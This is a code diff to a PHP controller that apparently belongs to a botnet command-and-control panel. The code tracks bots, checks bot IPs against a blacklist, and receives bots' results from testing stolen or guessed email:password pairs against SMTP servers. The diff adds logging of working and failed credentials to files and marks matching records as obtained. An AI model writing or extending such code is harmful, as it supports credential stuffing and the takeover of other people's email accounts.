@@ -32,7 +32,7 @@ class CommandController extends Controller
             abort(404);
         }
 
-        if ($statusAdmin->checkBlackList != 'noNeedCheckBlack') {
+        if ($statusAdmin->checkBlackList == 'needCheckBlack') {
             if ( ! isset($bot->blacklistdate)) {
                 if ($this->IpBlackListTest($ip) > 0) {
                     $bot->black         = 1;
@@ -300,22 +300,21 @@ class CommandController extends Controller
     public function smtpcheckres(Request $request)
     {
         $result = $request->get('result');
-
         $res = explode("\r\n", urldecode($result));
-
         foreach ($res as $item) {
             $r = explode('|', $item);
             if (count($r) > 3) {
+                $logFile    = "smtp_find_logs/test_good.txt";
                 $mailpass = $r[2] . ":" . $r[3];
             } else {
+                $logFile    = "smtp_find_logs/test_bad.txt";
                 $t = explode("://", $item);
-                if (count($t) < 2) {
-                    continue;
-                }
                 $mailpass = $t[1];
             }
 
-            $e = smtpfindpiece::where(['emailpas' => $mailpass])->first();
+            Storage::append($logFile, $item . "\r\n");
+
+            $e = smtpfindpiece::where(['emailpas' => trim($mailpass)])->first();
             if ($e != null) {
                 $e->status = urldecode($item);
                 $e->isget  = 1;
